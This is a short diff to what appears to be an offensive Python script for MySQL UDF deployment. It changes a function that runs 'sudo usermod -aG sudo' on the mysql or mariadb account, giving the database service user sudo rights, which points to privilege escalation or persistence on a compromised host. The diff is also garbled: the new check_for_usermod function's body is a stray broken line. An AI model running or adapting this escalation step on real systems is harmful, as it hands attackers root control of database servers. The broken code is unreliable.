@@ -44,13 +44,28 @@ def is_using_sysvinit():
     print("[-] System does not appear to be using sysvinit")
     return False
 
+def check_for_usermod():
+")
+    if result['status'] == 0:
+        print("[+] usermod found")
+    else:
+        print("[-] usermod not found")
+
 def add_sudo_user():
     print("[+] Attempting to add MySQL/MariaDB user to sudo group...")
-    result = sys.shell("sudo usermod -aG sudo mysql || sudo usermod -aG sudo mariadb")
+    print("[+] Checking if usermod is available...")
+    usermod_command = sys.shell("command -v usermod")
+    if usermod_command['status'] == 0:
+        print("[+] usermod found")
+    else:
+        print("[-] usermod not found")
+    result = sys.shell(f"sudo {usermod_command['stdout'].strip()} -aG sudo mysql || sudo {usermod_command['stdout'].strip()} -aG sudo mariadb")
     if result['status'] == 0:
         print("[+] Successfully added database user to sudo group")
     else:
         print("[-] Failed to add database user to sudo group")
+
+
 
 def main():
     print("[+] Starting MySQL UDF deployment process")
